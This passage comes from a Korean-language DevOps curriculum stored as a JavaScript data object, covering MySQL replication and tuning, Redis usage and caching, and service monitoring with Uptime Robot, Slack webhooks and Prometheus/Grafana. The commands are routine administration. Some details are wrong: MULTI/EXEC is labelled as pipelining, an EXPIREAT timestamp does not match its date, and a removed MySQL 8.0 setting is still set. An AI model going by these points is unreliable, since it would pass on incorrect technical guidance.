  MASTER_USER='repl_user',
  MASTER_PASSWORD='strong_password',
  MASTER_LOG_FILE='mysql-bin.000001',
  MASTER_LOG_POS=154;

# 복제 시작
START SLAVE;

# 복제 상태 확인
SHOW SLAVE STATUS\\G
-- Slave_IO_Running: Yes
-- Slave_SQL_Running: Yes
-- Seconds_Behind_Master: 0`},{heading:"4. 테이블 파티셔닝",content:"대용량 테이블을 논리적으로 분할하여 성능을 향상시킵니다.",code:`-- 날짜 기준 파티셔닝 (로그 테이블에 유용)
CREATE TABLE access_logs (
  id BIGINT AUTO_INCREMENT,
  user_id INT,
  accessed_at DATETIME,
  ip VARCHAR(45),
  PRIMARY KEY (id, accessed_at)
)
PARTITION BY RANGE (YEAR(accessed_at)) (
  PARTITION p2023 VALUES LESS THAN (2024),
  PARTITION p2024 VALUES LESS THAN (2025),
  PARTITION p2025 VALUES LESS THAN (2026),
  PARTITION p_future VALUES LESS THAN MAXVALUE
);

-- 파티션별 데이터 확인
SELECT
  PARTITION_NAME,
  TABLE_ROWS
FROM INFORMATION_SCHEMA.PARTITIONS
WHERE TABLE_NAME = 'access_logs';

-- 오래된 파티션 삭제 (빠른 삭제)
ALTER TABLE access_logs DROP PARTITION p2023;`},{heading:"5. 고급 성능 튜닝",code:`-- InnoDB 버퍼 풀 크기 (전체 메모리의 70-80%)
SET GLOBAL innodb_buffer_pool_size = 4G;

-- 쿼리 캐시 (MySQL 8.0에서는 제거됨, Redis로 대체 권장)
SET GLOBAL query_cache_size = 128M;

-- 연결 풀 크기
SET GLOBAL max_connections = 500;
SET GLOBAL wait_timeout = 300;  -- 유휴 연결 5분 후 종료

-- 임시 테이블 크기
SET GLOBAL tmp_table_size = 128M;
SET GLOBAL max_heap_table_size = 128M;

-- 정렬 버퍼 (복잡한 ORDER BY 성능 향상)
SET GLOBAL sort_buffer_size = 4M;`},{heading:"6. 프로파일링과 진단",code:`-- 프로파일링 활성화 (쿼리 세부 분석)
SET profiling = 1;

SELECT * FROM posts WHERE user_id = 123;

SHOW PROFILES;
-- Query_ID | Duration | Query

SHOW PROFILE FOR QUERY 1;
-- Status                | Duration
-- Opening tables        | 0.000050
-- Executing             | 0.002345
-- Sending data          | 0.001234
-- End                   | 0.000010

-- Performance Schema 활용
SELECT * FROM performance_schema.events_statements_summary_by_digest
ORDER BY SUM_TIMER_WAIT DESC
LIMIT 10;
-- 가장 느린 쿼리 10개`},{heading:"7. 실전 마이그레이션 전략",content:"무중단 마이그레이션 방법:",steps:[{label:"1단계: 새 슬레이브 추가",text:"기존 마스터에 새 슬레이브 연결"},{label:"2단계: 데이터 동기화",text:"슬레이브가 마스터를 완전히 따라잡을 때까지 대기"},{label:"3단계: 읽기 트래픽 전환",text:"애플리케이션의 SELECT 쿼리를 슬레이브로 전환"},{label:"4단계: 마스터 승격",text:"점검 시간에 슬레이브를 새 마스터로 승격"}]},{heading:"⚡ 고급 실습 과제",checklist:["마스터-슬레이브 복제 구성 (Docker Compose로 로컬 테스트)","슬레이브에서 읽기 전용 확인 (쓰기 시도 시 에러)","100만 행 이상 테이블에 파티셔닝 적용","파티션 프루닝(Partition Pruning) 효과 EXPLAIN으로 확인","Performance Schema로 가장 느린 쿼리 TOP 10 분석"]}]}}},{id:"2-3",name:"Redis 운영과 캐싱 전략",goal:"Redis를 효과적으로 활용하고 메모리를 관리할 수 있다",hours:6,keywords:["Redis management","session storage","cache strategy"],tasks:["Redis CLI로 데이터 조회","메모리 사용량 확인","세션 데이터 구조 파악"],content:{beginner:{title:"초급: Redis 기본 개념과 CLI 사용법",sections:[{heading:"📚 학습 목표",content:"Redis가 무엇인지 이해하고, Redis CLI로 데이터를 조회하고 관리할 수 있다."},{heading:"1. Redis란 무엇인가?",content:"Redis는 메모리 기반의 키-값(Key-Value) 저장소입니다. 매우 빠른 속도로 데이터를 읽고 쓸 수 있습니다.",list:["캐시: 자주 사용하는 데이터를 빠르게 조회 (DB 부하 감소)","세션 저장소: 로그인 정보, 장바구니 등","실시간 랭킹: 게임 순위, 인기 게시물","메시지 큐: 작업 대기열, 실시간 알림"]},{heading:"2. Redis vs MySQL",code:`# MySQL (디스크 기반)
- 영구 저장 (서버 재시작해도 데이터 유지)
- 복잡한 쿼리 가능 (JOIN, GROUP BY 등)
- 속도: 밀리초 단위 (1~100ms)

# Redis (메모리 기반)
- 휘발성 (기본적으로 재시작 시 삭제, 옵션으로 디스크 저장 가능)
- 단순한 키-값 조회
- 속도: 마이크로초 단위 (0.1ms 미만)

# 활용 예시
MySQL: 사용자 정보, 주문 내역 (영구 보관 필요)
Redis: 로그인 세션, 조회수 캐시 (일시적, 빠른 속도 필요)`},{heading:"3. Redis CLI 접속하기",steps:[{label:"방법 1: CapRover 대시보드",code:`Apps → Redis 앱 → ... 메뉴 → Web Terminal
redis-cli`},{label:"방법 2: Docker 명령어",code:`# Redis 컨테이너 찾기
docker ps | grep redis

# Redis CLI 실행
docker exec -it <container_id> redis-cli

# 연결 확인
PING
# 응답: PONG`}]},{heading:"4. 기본 명령어",code:`# 1. 문자열 저장/조회
SET username "john"
GET username
# 결과: "john"

# 2. 유효기간 설정 (TTL: Time To Live)
SETEX session:user123 3600 "logged_in"
# 3600초(1시간) 후 자동 삭제

# 3. 남은 시간 확인
TTL session:user123
# 결과: 3599 (초)

# 4. 키 존재 여부
EXISTS username
# 결과: 1 (존재), 0 (없음)

# 5. 키 삭제
DEL username

# 6. 모든 키 보기 (주의: 프로덕션에서는 위험!)
KEYS *

# 7. 특정 패턴의 키 검색
KEYS session:*

# 8. 데이터베이스 선택 (기본 0~15)
SELECT 1
# DB 1번으로 전환`},{heading:"5. 세션 데이터 구조 파악",content:"실제 서비스에서 Redis에 저장된 세션 데이터 확인하기:",code:`# 세션 키 패턴 찾기
KEYS sess:*
# 또는
KEYS PHPREDIS_SESSION:*

# 세션 데이터 조회
GET "sess:abc123def456"

# 결과 예시 (직렬화된 데이터)
# user_id|i:123;username|s:4:"john";cart|a:2:{i:0;s:5:"item1";i:1;s:5:"item2";}

# 세션 유효기간 확인
TTL "sess:abc123def456"
# 결과: 1800 (30분)`},{heading:"6. 메모리 사용량 확인",code:`# 서버 정보
INFO memory

# 주요 지표:
# used_memory_human: 15.23M (현재 사용 중인 메모리)
# maxmemory: 256M (최대 메모리 제한)
# used_memory_peak_human: 20.45M (최대 사용량)

# 모든 키 개수
DBSIZE
# 결과: 1523

# 특정 키의 메모리 사용량
MEMORY USAGE username
# 결과: 56 (bytes)`},{heading:"✅ 초급 실습",checklist:["Redis CLI 접속 후 PING 명령어로 연결 확인","SET/GET으로 문자열 저장/조회 테스트","SETEX로 10초 후 삭제되는 키 생성 후 TTL로 확인","KEYS 명령어로 현재 저장된 모든 키 확인","INFO memory로 메모리 사용량 확인"]}]},intermediate:{title:"중급: 캐싱 전략과 데이터 타입 활용",sections:[{heading:"📚 학습 목표",content:"다양한 Redis 데이터 타입을 활용하고, 효과적인 캐싱 전략을 수립할 수 있다."},{heading:"1. Redis 데이터 타입",content:"Redis는 문자열 외에도 다양한 자료구조를 지원합니다:",list:["String: 단순 값 (세션, 카운터)","Hash: 객체 저장 (사용자 정보)","List: 순서가 있는 목록 (최근 활동, 큐)","Set: 중복 없는 집합 (태그, 좋아요)","Sorted Set: 순위가 있는 집합 (랭킹, 리더보드)"]},{heading:"2. Hash 활용 (객체 저장)",code:`# 사용자 정보를 Hash로 저장
HSET user:123 username "john"
HSET user:123 email "john@example.com"
HSET user:123 age 30

# 여러 필드 한 번에 설정
HMSET user:456 username "alice" email "alice@example.com" age 25

# 전체 데이터 조회
HGETALL user:123
# 결과:
# 1) "username"
# 2) "john"
# 3) "email"
# 4) "john@example.com"
# 5) "age"
# 6) "30"

# 특정 필드만 조회
HGET user:123 username
# 결과: "john"

# 필드 삭제
HDEL user:123 age`},{heading:"3. List 활용 (최근 활동, 큐)",code:`# 최근 본 상품 (왼쪽에 추가)
LPUSH recent:user123 "product:456"
LPUSH recent:user123 "product:789"

# 최근 5개만 유지 (나머지 삭제)
LTRIM recent:user123 0 4

# 전체 조회
LRANGE recent:user123 0 -1
# 결과: ["product:789", "product:456"]

# 작업 큐 (오른쪽에 추가, 왼쪽에서 꺼내기)
RPUSH job:queue "task1"
RPUSH job:queue "task2"
LPOP job:queue
# 결과: "task1" (FIFO)`},{heading:"4. Sorted Set 활용 (랭킹)",code:`# 게임 점수 저장 (점수 기준 자동 정렬)
ZADD leaderboard 1500 "player1"
ZADD leaderboard 2300 "player2"
ZADD leaderboard 1800 "player3"

# 상위 3명 조회 (내림차순)
ZREVRANGE leaderboard 0 2 WITHSCORES
# 결과:
# 1) "player2"
# 2) "2300"
# 3) "player3"
# 4) "1800"
# 5) "player1"
# 6) "1500"

# 특정 플레이어 순위 (0부터 시작)
ZREVRANK leaderboard "player3"
# 결과: 1 (2등)

# 점수 증가
ZINCRBY leaderboard 100 "player1"
# player1의 점수 1600으로 증가`},{heading:"5. 캐싱 전략",content:"언제 캐시를 사용하고, 언제 갱신할까?",list:["Cache-Aside: 앱이 직접 캐시 관리 (가장 일반적)","Write-Through: DB 쓰기 시 캐시도 동시 업데이트","Write-Behind: 캐시에만 쓰고 나중에 DB 동기화","Refresh-Ahead: 만료 직전 미리 갱신"],code:`# Cache-Aside 패턴 (의사코드)
function getUser(userId) {
  // 1. 캐시에서 먼저 조회
  cached = redis.get("user:" + userId)
  if (cached) {
    return cached  // 캐시 히트
  }

  // 2. 캐시 미스 → DB 조회
  user = db.query("SELECT * FROM users WHERE id = ?", userId)

  // 3. 캐시에 저장 (1시간 유효)
  redis.setex("user:" + userId, 3600, JSON.stringify(user))

  return user
}

# 캐시 무효화 (데이터 변경 시)
function updateUser(userId, data) {
  db.query("UPDATE users SET ... WHERE id = ?", userId, data)
  redis.del("user:" + userId)  // 캐시 삭제
}`},{heading:"6. TTL 전략",content:"캐시 유효기간 설정 가이드:",list:["자주 변경되는 데이터: 짧게 (1~5분)","거의 변경 없는 데이터: 길게 (1시간~1일)","세션: 로그인 유지 시간 (30분~24시간)","임시 데이터: 매우 짧게 (10초~1분)"],code:`# 상품 정보 (1시간)
SETEX product:123 3600 "{ ... }"

# 실시간 재고 (1분)
SETEX stock:item456 60 "15"

# 일일 방문자 수 (자정까지)
SET daily:visits:20250104 1523
EXPIREAT daily:visits:20250104 1735776000  # Unix timestamp`},{heading:"✅ 중급 실습",checklist:["Hash로 사용자 객체 저장 후 HGETALL로 조회","List로 최근 활동 5개 저장 후 LTRIM으로 제한","Sorted Set으로 점수 랭킹 구현 후 상위 10명 조회","Cache-Aside 패턴으로 상품 정보 캐싱 구현","다양한 TTL 설정하여 자동 삭제 확인"]}]},advanced:{title:"고급: 메모리 최적화와 고가용성",sections:[{heading:"📚 학습 목표",content:"Redis 메모리를 효율적으로 관리하고, 클러스터와 센티널로 고가용성을 구현한다."},{heading:"1. 메모리 관리 전략",content:"메모리가 부족할 때 어떻게 처리할까?",code:`# maxmemory 설정 (redis.conf 또는 런타임)
CONFIG SET maxmemory 256mb

# 메모리 정책 (maxmemory-policy)
CONFIG SET maxmemory-policy allkeys-lru

# 정책 종류:
# noeviction: 메모리 가득 차면 쓰기 거부 (기본값)
# allkeys-lru: 모든 키 중 LRU(Least Recently Used) 삭제
# allkeys-lfu: 모든 키 중 LFU(Least Frequently Used) 삭제
# volatile-lru: TTL 있는 키 중 LRU 삭제
# volatile-ttl: TTL 짧은 키부터 삭제
# allkeys-random: 랜덤 삭제

# 현재 정책 확인
CONFIG GET maxmemory-policy`},{heading:"2. 메모리 최적화 기법",code:`# 1. 짧은 키 이름 사용
# 나쁨: user:profile:123:information
# 좋음: u:p:123

# 2. Hash 대신 String (작은 객체)
# Hash: 각 필드마다 오버헤드
# String: JSON 직렬화하여 저장
SET u:123 '{"name":"john","age":30}'

# 3. Pipeline으로 여러 명령 한 번에 전송
# 네트워크 왕복 시간(RTT) 감소
MULTI
SET key1 "value1"
SET key2 "value2"
SET key3 "value3"
EXEC

# 4. 대량 데이터 삭제는 UNLINK (비동기)
DEL bigkey  # 블로킹 (모든 작업 중단)
UNLINK bigkey  # 논블로킹 (백그라운드 삭제)

# 5. 불필요한 키 정리
redis-cli --scan --pattern "temp:*" | xargs redis-cli DEL`},{heading:"3. 영구 저장 (Persistence)",content:"Redis 재시작 시 데이터 복구 방법:",list:["RDB (Snapshot): 주기적으로 전체 데이터 덤프","AOF (Append Only File): 모든 쓰기 명령 로그 기록","RDB + AOF: 두 가지 병행 (권장)"],code:`# RDB 설정 (redis.conf)
save 900 1      # 900초 동안 1개 이상 변경 시 저장
save 300 10     # 300초 동안 10개 이상 변경 시 저장
save 60 10000   # 60초 동안 10000개 이상 변경 시 저장

# 수동 스냅샷
BGSAVE  # 백그라운드에서 저장

# AOF 활성화
CONFIG SET appendonly yes
CONFIG SET appendfsync everysec  # 1초마다 디스크 동기화

# AOF 재작성 (파일 크기 최적화)
BGREWRITEAOF`},{heading:"4. Redis Sentinel (고가용성)",content:"마스터 장애 시 자동으로 슬레이브를 승격시킵니다.",code:`# sentinel.conf 설정
sentinel monitor mymaster 127.0.0.1 6379 2
# 2개 센티널이 동의하면 failover

sentinel down-after-milliseconds mymaster 5000
# 5초 응답 없으면 다운으로 간주

sentinel failover-timeout mymaster 60000
# 페일오버 타임아웃 60초

# 센티널 실행
redis-sentinel /path/to/sentinel.conf

# 마스터 상태 확인
redis-cli -p 26379 sentinel master mymaster`},{heading:"5. Redis Cluster (분산 처리)",content:"데이터를 여러 노드에 분산하여 처리 능력을 확장합니다.",code:`# 클러스터 생성 (최소 6개 노드: 3 마스터 + 3 슬레이브)
redis-cli --cluster create \\
  127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 \\
  127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005 \\
  --cluster-replicas 1

# 클러스터 상태 확인
redis-cli -c -p 7000 cluster info

# 키 분산 원리: Hash Slot (0~16383)
# CRC16(key) % 16384 = slot 번호
# 각 마스터가 slot 범위 담당

# 클러스터 모드에서 키 조회
redis-cli -c -p 7000
SET mykey "value"
# -> Redirected to slot [14687] located at 127.0.0.1:7002`},{heading:"6. 모니터링과 진단",code:`# 실시간 명령어 모니터링 (주의: 성능 저하 가능)
MONITOR

# 슬로우 로그 (느린 명령 기록)
CONFIG SET slowlog-log-slower-than 10000  # 10ms 이상
SLOWLOG GET 10
# 가장 느린 명령 10개 표시

# 클라이언트 연결 목록
CLIENT LIST

# 통계 정보
INFO stats
# keyspace_hits: 캐시 히트
# keyspace_misses: 캐시 미스
# 히트율 = hits / (hits + misses)

# 메모리 파편화 확인
INFO memory | grep mem_fragmentation_ratio
# 1.0 ~ 1.5: 정상
# > 1.5: 메모리 파편화 발생 (재시작 필요)`},{heading:"⚡ 고급 실습 과제",checklist:["maxmemory-policy를 allkeys-lru로 설정 후 메모리 가득 채워 자동 삭제 확인","RDB + AOF 활성화하여 Redis 재시작 후 데이터 복구 테스트","Docker Compose로 Sentinel 3개 노드 구성 후 마스터 강제 종료 시 자동 페일오버 확인","SLOWLOG로 느린 명령 찾아 최적화","INFO stats로 캐시 히트율 계산 (80% 이상 목표)"]}]}}},{id:"2-4",name:"모니터링과 알림 시스템",goal:"문제를 조기에 발견하고 알림을 받을 수 있다",hours:4,keywords:["monitoring","alerting","uptime tracking"],tasks:["Uptime Robot 계정 생성 및 설정","NetData에서 실시간 그래프 확인","알림 테스트 (의도적으로 서비스 중지)"],content:{beginner:{title:"초급: Uptime 모니터링과 기본 알림 설정",sections:[{heading:"📚 학습 목표",content:"서비스가 다운되었을 때 즉시 알림을 받을 수 있도록 Uptime 모니터링을 설정한다."},{heading:"1. 모니터링이 필요한 이유",content:"서버는 언제든 다운될 수 있습니다. 사용자보다 먼저 문제를 발견해야 합니다.",list:["서버 다운: 하드웨어 장애, 네트워크 문제","애플리케이션 크래시: 메모리 부족, 버그","데이터베이스 장애: 연결 수 초과, 디스크 부족","성능 저하: CPU 100%, 느린 응답 시간"]},{heading:"2. Uptime Robot 설정",content:"무료로 50개 모니터를 5분 간격으로 체크할 수 있습니다.",steps:[{label:"Step 1",text:"계정 생성",code:`https://uptimerobot.com 접속
Sign Up (무료)`},{label:"Step 2",text:"새 모니터 추가",code:`Add New Monitor → HTTP(s) 선택
Friendly Name: My CMS
URL: https://your-site.com
Monitoring Interval: 5 minutes`},{label:"Step 3",text:"알림 설정",code:`Alert Contacts → Add Alert Contact
Email 또는 Slack, Discord, Telegram 등
알림 받을 이메일 입력 후 Verify`},{label:"Step 4",text:"모니터 활성화",code:`Create Monitor 클릭
5분마다 사이트 체크 시작`}]},{heading:"3. 모니터링 지표",content:"Uptime Robot이 확인하는 항목:",list:["HTTP 응답 코드: 200 OK인지 확인","응답 시간: 몇 초 만에 응답하는가","다운타임: 며칠 중 몇 시간 다운되었는가","Uptime 비율: 99.9% (한 달에 약 43분 다운)"],code:`# Uptime 목표
99.9% (Three Nines): 월 43분 다운 (일반 서비스)
99.99% (Four Nines): 월 4분 다운 (중요 서비스)
99.999% (Five Nines): 월 26초 다운 (금융, 의료)

# 현실적 목표
개인 프로젝트: 99% 이상 (월 7시간)
소규모 비즈니스: 99.5% 이상 (월 3.5시간)
대규모 서비스: 99.9% 이상`},{heading:"4. 알림 테스트",content:"실제로 알림이 잘 작동하는지 테스트해봅시다.",steps:[{label:"방법 1: 서비스 중지",code:`CapRover → Apps → 프론트엔드 앱 → Stop
5분 대기
→ 알림 수신 확인
→ 다시 Start`},{label:"방법 2: 방화벽 차단",code:`서버 방화벽에서 HTTP(80), HTTPS(443) 임시 차단
5분 대기
→ 알림 수신 확인
→ 방화벽 해제`},{label:"알림 예시",text:`이메일 제목: [Alert] My CMS is DOWN
내용: Your monitor 'My CMS' is currently down.
Reason: Connection timeout`}]},{heading:"5. CapRover 내장 NetData",content:"CapRover에는 NetData가 기본 내장되어 실시간 시스템 모니터링을 제공합니다.",code:`# NetData 접속
https://captain.your-server.com/#/monitoring

# 확인 가능한 지표:
- CPU 사용률 (%)
- 메모리 사용량 (MB)
- 디스크 I/O (MB/s)
- 네트워크 트래픽 (Mbps)
- 컨테이너별 리소스 사용량

# 주의할 지표:
CPU > 80%: 처리 부하 과다
메모리 > 90%: 메모리 부족 위험
디스크 > 90%: 공간 확보 필요`},{heading:"6. 일일 체크리스트",checklist:["Uptime Robot 대시보드에서 모든 서비스 Up 상태 확인","NetData에서 CPU/메모리 정상 범위 확인","응답 시간이 평소보다 느리지 않은지 확인","에러 알림이 왔다면 즉시 확인"]},{heading:"✅ 초급 실습",checklist:["Uptime Robot 계정 생성 및 메인 사이트 모니터 추가","이메일 알림 설정 및 Verify","의도적으로 서비스 중지 후 5분 내 알림 수신 확인","NetData 접속하여 실시간 CPU/메모리 그래프 확인","Uptime Robot 대시보드에서 응답 시간 그래프 확인"]}]},intermediate:{title:"중급: 다층 모니터링과 알림 채널 확장",sections:[{heading:"📚 학습 목표",content:"여러 계층(서버, 애플리케이션, 데이터베이스)을 모니터링하고, 다양한 채널로 알림을 받는다."},{heading:"1. 모니터링 계층",content:"서비스는 여러 계층으로 구성되어 있으며, 각각 모니터링이 필요합니다.",list:["인프라 계층: 서버 CPU, 메모리, 디스크","네트워크 계층: 응답 시간, 연결 상태","애플리케이션 계층: API 응답, 에러율","데이터베이스 계층: 연결 수, 슬로우 쿼리"]},{heading:"2. 여러 엔드포인트 모니터링",content:"메인 페이지뿐만 아니라 중요한 API도 모니터링합니다.",code:`# Uptime Robot 모니터 추가
1. 프론트엔드: https://your-site.com
2. API 헬스체크: https://api.your-site.com/health
3. 관리자 페이지: https://admin.your-site.com
4. 결제 API: https://api.your-site.com/payment/status

# 각 모니터마다 다른 설정:
- 프론트엔드: 5분 간격
- API: 3분 간격 (더 중요)
- 결제: 1분 간격 (가장 중요, 유료 플랜)`},{heading:"3. Slack 알림 설정",content:"팀 협업 시 Slack으로 알림받기:",steps:[{label:"Step 1",text:"Slack Webhook 생성",code:`Slack → Apps → Incoming Webhooks
Add to Slack → 채널 선택 (#alerts)
Webhook URL 복사`},{label:"Step 2",text:"Uptime Robot 연동",code:`Alert Contacts → Add Alert Contact
Type: Webhook
Webhook URL: 붙여넣기
Post Value: JSON 형식 설정`},{label:"Step 3",text:"알림 메시지 커스터마이즈",code:`{
  "text": "*[ALERT]* {{monitorFriendlyName}} is {{monitorAlertType}}",
  "attachments": [
    {
      "color": "danger",
      "fields": [
        {"title": "URL", "value": "{{monitorURL}}", "short": false},
        {"title": "Reason", "value": "{{alertDetails}}", "short": false}
      ]
    }
  ]
}`}]},{heading:"4. 커스텀 헬스체크 엔드포인트",content:"애플리케이션이 자체적으로 건강 상태를 보고하도록 합니다.",code:`// Node.js 예시
app.get('/health', async (req, res) => {
  try {
    // 1. DB 연결 확인
    await db.ping();

    // 2. Redis 연결 확인
    await redis.ping();

    // 3. 디스크 공간 확인
    const disk = await checkDiskSpace('/');
    if (disk.free < 1e9) throw new Error('Low disk space');

    // 4. 메모리 확인
    const mem = process.memoryUsage();
    if (mem.heapUsed / mem.heapTotal > 0.9) {
      throw new Error('High memory usage');
    }

    res.status(200).json({
      status: 'ok',
      timestamp: Date.now(),
      uptime: process.uptime(),
      checks: {
        database: 'ok',
        redis: 'ok',
        disk: 'ok',
        memory: 'ok'
      }
    });
  } catch (error) {
    res.status(503).json({
      status: 'error',
      error: error.message
    });
  }
});

// Uptime Robot 설정:
// URL: https://api.your-site.com/health
// Keyword: "status":"ok" (이 텍스트 포함 여부 확인)`},{heading:"5. 응답 시간 기준 알림",content:"사이트가 느려졌을 때도 알림받기:",code:`# Uptime Robot 설정
Advanced Settings → Response Time Alert
Threshold: 2000ms (2초)
Consecutive Checks: 3 (3번 연속 초과 시 알림)

# 이렇게 하면:
- 일시적 느림: 무시
- 지속적 느림: 알림`},{heading:"6. 애플리케이션 로그 모니터링",content:"특정 에러가 로그에 나타나면 알림:",code:`# 간단한 로그 모니터링 스크립트
#!/bin/bash
# check_errors.sh

ERROR_COUNT=$(docker logs backend_container --since 5m | grep -c "ERROR\\|FATAL")

if [ $ERROR_COUNT -gt 10 ]; then
  curl -X POST https://hooks.slack.com/services/YOUR/WEBHOOK/URL \\
    -H 'Content-Type: application/json' \\
    -d "{
      \\"text\\": \\"⚠️ Too many errors: $ERROR_COUNT in last 5 minutes\\"
    }"
fi

# Cron으로 5분마다 실행
*/5 * * * * /path/to/check_errors.sh`},{heading:"✅ 중급 실습",checklist:["최소 3개 엔드포인트 (프론트엔드, API, DB) 모니터링 추가","Slack 또는 Discord Webhook 연동하여 알림 수신","/health 엔드포인트 구현 후 Uptime Robot 연결","응답 시간 2초 이상 시 알림 설정","Docker 로그에서 에러 카운트하는 스크립트 작성"]}]},advanced:{title:"고급: 종합 모니터링과 SRE 지표",sections:[{heading:"📚 학습 목표",content:"Prometheus + Grafana로 종합 모니터링 대시보드를 구축하고, SLI/SLO를 정의한다."},{heading:"1. Prometheus + Grafana 스택",content:"시계열 데이터를 수집하고 시각화하는 산업 표준 도구입니다.",list:["Prometheus: 메트릭 수집 및 저장 (시계열 DB)","Grafana: 데이터 시각화 대시보드","Exporters: 각 서비스의 메트릭 노출 (Node, MySQL, Redis)","Alertmanager: 복잡한 알림 규칙 관리"]},{heading:"2. CapRover에 Prometheus 설치",code:`# CapRover Apps → One-Click Apps → Prometheus
# 설정:
App Name: prometheus
Port: 9090

# prometheus.yml 설정 (환경변수 또는 볼륨)
global:
  scrape_interval: 15s

scrape_configs:
  # Node Exporter (서버 메트릭)
  - job_name: 'node'
    static_configs:
      - targets: ['node-exporter:9100']

  # MySQL Exporter
  - job_name: 'mysql'
    static_configs:
      - targets: ['mysql-exporter:9104']

  # Redis Exporter
  - job_name: 'redis'
    static_configs:
      - targets: ['redis-exporter:9121']

  # Application (커스텀)
  - job_name: 'app'
    static_configs:
      - targets: ['backend:3000']`},{heading:"3. Grafana 대시보드 구성",steps:[{label:"Step 1",text:"Grafana 설치",code:`CapRover → One-Click Apps → Grafana
App Name: grafana
접속: https://grafana.your-server.com
기본 로그인: admin / admin`},{label:"Step 2",text:"Prometheus 데이터소스 추가",code:`Configuration → Data Sources → Add Prometheus
URL: http://srv-captain--prometheus:9090
Save & Test`},{label:"Step 3",text:"대시보드 Import",code:`Dashboards → Import
Grafana.com Dashboard:
- Node Exporter: 1860
- MySQL: 7362
- Redis: 11835
Select Prometheus Data Source → Import`}]},{heading:"4. 커스텀 메트릭 노출",content:"애플리케이션에서 비즈니스 메트릭 노출하기:",code:`// Node.js (prom-client 라이브러리)
const promClient = require('prom-client');
const register = new promClient.Registry();

// 기본 메트릭 (CPU, 메모리 등)
promClient.collectDefaultMetrics({ register });

// 커스텀 카운터
const requestCounter = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total HTTP requests',
  labelNames: ['method', 'path', 'status'],
  registers: [register]
});

// 커스텀 히스토그램 (응답 시간)
const responseTime = new promClient.Histogram({
  name: 'http_response_time_seconds',
  help: 'HTTP response time',
  labelNames: ['method', 'path'],
  registers: [register]
});

// 미들웨어
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    requestCounter.inc({
      method: req.method,
      path: req.route?.path || 'unknown',
      status: res.statusCode
    });
    responseTime.observe(
      { method: req.method, path: req.route?.path },
      (Date.now() - start) / 1000
    );
  });
  next();
});

// 메트릭 엔드포인트
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});`},{heading:"5. SLI/SLO 정의",content:"서비스 수준 목표를 설정하고 추적합니다.",code:`# SLI (Service Level Indicator): 측정 가능한 지표
1. 가용성: Uptime / Total Time
2. 지연시간: 95th percentile 응답 시간
3. 에러율: Error Requests / Total Requests

# SLO (Service Level Objective): 목표 수준
1. 가용성: 99.9% 이상 (월 43분 이하 다운)
2. 지연시간: 95%의 요청이 500ms 이내
3. 에러율: 0.1% 이하 (1000 요청 중 1개 미만)

# SLA (Service Level Agreement): 고객 약속
- SLO 미달 시 보상 (환불, 크레딧 등)

# Prometheus Query 예시
# 가용성
avg_over_time(up[30d]) * 100

# 95th percentile 응답 시간
histogram_quantile(0.95, http_response_time_seconds_bucket)

# 에러율
sum(rate(http_requests_total{status=~"5.."}[5m])) /
sum(rate(http_requests_total[5m])) * 100`},{heading:"6. 알림 규칙 (Alertmanager)",code:`# Prometheus alert.rules.yml
groups:
  - name: example
    interval: 30s
    rules:
      # 서버 다운
      - alert: InstanceDown
        expr: up == 0
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Instance {{ $labels.instance }} is down"

      # 높은 응답 시간
      - alert: HighResponseTime
        expr: histogram_quantile(0.95, http_response_time_seconds_bucket) > 2
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: "95th percentile response time > 2s"

      # 높은 메모리 사용량
      - alert: HighMemoryUsage
        expr: (node_memory_MemTotal_bytes - node_memory_MemAvailable_bytes) / node_memory_MemTotal_bytes > 0.9
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "Memory usage > 90%"

      # 디스크 공간 부족
      - alert: DiskSpaceLow
        expr: (node_filesystem_avail_bytes / node_filesystem_size_bytes) < 0.1
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Disk space < 10%"`},{heading:"7. On-Call 로테이션",content:"24/7 모니터링을 위한 당직 체계:",list:["PagerDuty: 당직자 자동 호출 (전화, SMS)","Opsgenie: 에스컬레이션 정책 (1차 → 2차 → 매니저)","VictorOps: 타임존별 로테이션","개인 프로젝트: Slack + 스마트폰 알림으로 충분"]},{heading:"⚡ 고급 실습 과제",checklist:["Prometheus + Grafana 스택 구축 및 Node/MySQL/Redis Exporter 연동","커스텀 메트릭 (요청 수, 응답 시간) 노출 및 Grafana 그래프 생성","SLI 정의 후 Grafana 대시보드에 표시 (가용성, 지연시간, 에러율)","Alertmanager로 알림 규칙 설정 (CPU > 80%, 메모리 > 90%)","7일간 메트릭 수집 후 SLO 달성 여부 분석"]}]}}}]},{id:"tier3",name:"Tier 3: 확장과 최적화",period:"5~8주",color:"bg-green-100 border-green-300 text-green-800",reason:"사용자가 늘어나고 데이터가 쌓이면서 생기는 문제 해결",topics:[{id:"3-1",name:"성능 최적화 기초",goal:"병목 지점을 찾고 개선할 수 있다",hours:8,keywords:["performance optimization","bottleneck analysis","web vitals"],tasks:["Lighthouse로 현재 점수 측정","가장 느린 페이지 3개 찾기","이미지 최적화 1회 실행"],content:{beginner:{title:"초급: 성능 문제가 무엇인지 이해하고 측정 도구 사용하기",sections:[{heading:"📚 학습 목표",content:"웹사이트의 성능을 측정하고, 어디가 느린지 파악할 수 있다."},{heading:"1. 성능이 왜 중요한가?",content:"사용자는 3초 안에 로딩되지 않으면 페이지를 떠납니다.",list:["로딩 시간 1초 증가 → 전환율 7% 감소","모바일에서는 더 심각 (4G 환경)","검색엔진 순위에도 영향 (SEO)","서버 리소스 낭비 → 운영 비용 증가"]},{heading:"2. Core Web Vitals 이해하기",content:"Google이 정의한 3가지 핵심 성능 지표:",code:`# LCP (Largest Contentful Paint)
- 가장 큰 콘텐츠가 화면에 표시되는 시간
- 목표: 2.5초 이내
- 예: 메인 이미지, 큰 텍스트 블록

# FID (First Input Delay)
- 사용자가 클릭했을 때 반응하는 시간
- 목표: 100ms 이내
- 예: 버튼 클릭, 링크 터치

# CLS (Cumulative Layout Shift)
- 페이지 로딩 중 레이아웃이 밀리는 정도
- 목표: 0.1 이하
- 예: 이미지 로딩으로 텍스트가 아래로 밀림`},{heading:"3. Lighthouse로 성능 측정하기",steps:[{label:"Chrome DevTools 사용",code:`# 1. 크롬 브라우저에서 F12 (개발자 도구)
# 2. Lighthouse 탭 클릭
# 3. Categories: Performance 체크
